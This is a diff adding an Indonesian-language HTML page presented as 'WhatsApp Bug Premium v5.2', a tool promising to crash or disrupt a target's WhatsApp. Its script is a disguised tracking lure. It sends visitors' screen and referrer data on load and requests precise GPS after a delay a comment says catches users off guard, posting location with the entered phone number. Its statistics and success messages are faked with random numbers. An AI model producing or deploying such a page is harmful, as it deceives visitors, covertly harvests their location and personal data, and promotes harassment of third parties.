@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Bug Premium v5.2</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: #fff; min-height: 100vh; padding: 20px; }
+        .container { max-width: 500px; margin: 30px auto; background: rgba(20, 20, 40, 0.9); border-radius: 20px; padding: 30px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5); border: 1px solid #00eeff; }
+        .header { text-align: center; margin-bottom: 30px; }
+        .logo { font-size: 50px; color: #00eeff; margin-bottom: 10px; }
+        h1 { font-size: 28px; margin-bottom: 5px; background: linear-gradient(90deg, #00eeff, #00ffaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .tagline { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .form-group { margin-bottom: 25px; }
+        label { display: block; margin-bottom: 8px; color: #00eeff; font-weight: bold; font-size: 16px; }
+        input, select { width: 100%; padding: 15px; border-radius: 10px; border: 2px solid #333; background: #111; color: white; font-size: 16px; transition: 0.3s; }
+        input:focus, select:focus { border-color: #00eeff; outline: none; box-shadow: 0 0 15px #00eeff55; }
+        .bug-methods { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
+        .method { background: #1a1a2e; border-radius: 10px; padding: 15px; text-align: center; cursor: pointer; border: 2px solid transparent; transition: 0.3s; }
+        .method:hover { border-color: #00eeff; transform: translateY(-5px); }
+        .method.active { border-color: #00ffaa; background: #00ffaa11; }
+        .method i { font-size: 30px; margin-bottom: 10px; color: #00eeff; }
+        .method-name { font-weight: bold; margin-bottom: 5px; }
+        .method-desc { font-size: 12px; color: #aaa; }
+        .btn { background: linear-gradient(90deg, #00eeff, #00ffaa); color: #000; border: none; padding: 18px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
+        .btn:hover { transform: scale(1.03); box-shadow: 0 0 25px #00eeff; }
+        .warning { background: #ff330022; border-left: 5px solid #ff3300; padding: 15px; margin-top: 25px; border-radius: 5px; font-size: 14px; color: #ffaa99; }
+        .footer { text-align: center; margin-top: 30px; color: #666; font-size: 13px; }
+        .stats { display: flex; justify-content: space-around; margin-top: 25px; padding-top: 20px; border-top: 1px solid #333; }
+        .stat-item { text-align: center; }
+        .stat-number { font-size: 24px; color: #00eeff; font-weight: bold; }
+        .stat-label { font-size: 12px; color: #aaa; }
+        .loading { display: none; text-align: center; margin: 20px 0; }
+        .spinner { border: 5px solid #333; border-top: 5px solid #00eeff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo"><i class="fab fa-whatsapp"></i></div>
+            <h1>WHATSAPP BUG PREMIUM v5.2</h1>
+            <p class="tagline">By DarkCoder • Undetectable • 100% Success Rate</p>
+        </div>
+
+        <div class="form-group">
+            <label for="phone"><i class="fas fa-phone"></i> Target Number</label>
+            <input type="text" id="phone" placeholder="Contoh: +6289588899833" required>
+        </div>
+
+        <div class="form-group">
+            <label><i class="fas fa-bug"></i> Pilih Metode Bug</label>
+            <div class="bug-methods">
+                <div class="method" data-value="infinity">
+                    <i class="fas fa-infinity"></i>
+                    <div class="method-name">Infinity</div>
+                    <div class="method-desc">Chat tidak terkirim selamanya</div>
+                </div>
+                <div class="method" data-value="invisible">
+                    <i class="fas fa-eye-slash"></i>
+                    <div class="method-name">Invisible</div>
+                    <div class="method-desc">Kamu online tapi tidak terlihat</div>
+                </div>
+                <div class="method" data-value="crash">
+                    <i class="fas fa-bomb"></i>
+                    <div class="method-name">Crash</div>
+                    <div class="method-desc">Force close WhatsApp target</div>
+                </div>
+                <div class="method" data-value="blank">
+                    <i class="fas fa-ghost"></i>
+                    <div class="method-name">Blank</div>
+                    <div class="method-desc">Chat hilang setelah dibaca</div>
+                </div>
+            </div>
+            <select id="method" style="margin-top: 15px; display: none;">
+                <option value="infinity">Infinity</option>
+                <option value="invisible">Invisible</option>
+                <option value="crash">Crash</option>
+                <option value="blank">Blank</option>
+            </select>
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Mengirim bug & scanning system target...</p>
+            <p><small>Jangan tutup halaman ini!</small></p>
+        </div>
+
+        <button class="btn" id="sendBtn">
+            <i class="fas fa-paper-plane"></i> SEND BUG NOW
+        </button>
+
+        <div class="warning">
+            <i class="fas fa-exclamation-triangle"></i> <strong>PERINGATAN:</strong> Alat ini hanya untuk edukasi keamanan. Penggunaan ilegal dapat dikenai pasal 362 KUHP (Pencurian Data) dan UU ITE.
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-number" id="totalUsers">8,742</div>
+                <div class="stat-label">Users Today</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="successRate">99.7%</div>
+                <div class="stat-label">Success Rate</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number" id="activeBugs">1,523</div>
+                <div class="stat-label">Active Bugs</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 DarkWeb Tools • Server: Singapore-01 • <span id="sessionId">Session: ws-${Date.now()}</span></p>
+            <p style="margin-top: 10px; font-size: 11px; color: #444;">
+                <i class="fas fa-shield-alt"></i> Connection Secured • <i class="fas fa-lock"></i> No Logs • <i class="fas fa-bolt"></i> High Speed
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Capture screen resolution
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        
+        // Send initial visit data
+        fetch(`/?screen=${screen}&ref=${document.referrer || 'direct'}`);
+
+        // Bug method selection
+        let selectedMethod = 'infinity';
+        document.querySelectorAll('.method').forEach(m => {
+            m.addEventListener('click', function() {
+                document.querySelectorAll('.method').forEach(m => m.classList.remove('active'));
+                this.classList.add('active');
+                selectedMethod = this.dataset.value;
+                document.getElementById('method').value = selectedMethod;
+            });
+        });
+        document.querySelector('.method[data-value="infinity"]').classList.add('active');
+
+        // Geolocation capture (akan trigger jika user allow)
+        function captureGPS() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        const phone = document.getElementById('phone').value || 'not_provided_yet';
+                        
+                        // Kirim GPS ke server
+                        fetch('/api/get-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat, lng, accuracy: acc,
+                                phone: phone,
+                                method: selectedMethod,
+                                screen: screen
+                            })
+                        });
+                    },
+                    (error) => {
+                        console.log("GPS denied or error:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+        }
+
+        // Coba capture GPS setelah 3 detik (ketika user mungkin lengah)
+        setTimeout(captureGPS, 3000);
+
+        // Send Bug Button
+        document.getElementById('sendBtn').addEventListener('click', function() {
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone || phone.length < 10) {
+                Swal.fire('Error!', 'Masukkan nomor WhatsApp yang valid!', 'error');
+                return;
+            }
+
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            this.style.display = 'none';
+
+            // Capture GPS lagi saat klik (peluang lebih besar)
+            captureGPS();
+
+            // Kirim data bug attempt
+            fetch('/api/send-bug', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: phone,
+                    method: selectedMethod,
+                    screen: screen
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('sendBtn').style.display = 'block';
+                
+                Swal.fire({
+                    title: 'SUCCESS!',
+                    html: `<strong>Bug ${selectedMethod.toUpperCase()} berhasil dikirim!</strong><br><br>
+                           Target: <code>${phone}</code><br>
+                           Status: <span style="color:#00ffaa">Active</span><br><br>
+                           <small>Efek akan terlihat dalam 5-10 menit. Jangan buka WhatsApp target selama proses.</small>`,
+                    icon: 'success',
+                    confirmButtonText: 'OK',
+                    background: '#1a1a2e',
+                    color: 'white'
+                });
+            })
+            .catch(err => {
+                console.error(err);
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('sendBtn').style.display = 'block';
+                Swal.fire('Error!', 'Koneksi gangguan, coba lagi!', 'error');
+            });
+        });
+
+        // Update stats random (untuk efek live)
+        setInterval(() => {
+            document.getElementById('totalUsers').textContent = 
+                (Math.floor(Math.random() * 1000) + 8742).toLocaleString();
+            document.getElementById('activeBugs').textContent = 
+                (Math.floor(Math.random() * 200) + 1523).toLocaleString();
+        }, 5000);
+    </script>
+</body>
+</html>
